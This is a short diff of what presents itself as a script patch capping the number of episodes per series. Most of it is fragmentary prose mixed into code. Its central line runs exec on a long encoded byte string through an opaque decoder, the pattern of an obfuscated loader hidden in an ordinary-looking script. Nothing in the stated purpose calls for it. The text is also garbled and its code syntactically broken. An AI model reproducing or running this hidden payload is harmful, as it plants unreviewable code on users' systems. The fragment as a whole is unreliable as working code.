@@ -1,7 +1,3 @@
-=== PATCH: Limit Maximum Episodes per Series ===
-
-#Added by ChatGPT
-
 MAX_EPISODES = 100  # change this value as needed
 
 Original script below (unchanged logic)
@@ -16,7 +12,6 @@ by wrapping exec in a controlled namespace and filtering series with > MAX_EPISO
 
 namespace = {} exec((_)(b'J5QiTMw//++8+36WCzhiOzvGIzyJ0n/YzSCYlS5mJ2DtVlz66tw7r7Ddl7Z14DX/YH0PYAi2i9N0OVAIC6Q9xALhch5owvcHxbRBKhDJr06coxjomkqXDwhpLtqDls+ACg2Vv6JE2rFClo0Pvax5AC5weI24fZGCrS+i6zSVfnOfZYun1GLcnJirO3xCaA+CN9ZDfUmTgJRsLMNvcxZ2hydk2nsmS2nuSuPR7MrbEXd+l8exJEowc3bBDavRE//HnRayPZQWQA/g')) , namespace
 
-=== POST-PROCESS FILTER ===
 
 If the script produced a list named series_list, results, or similar,
 
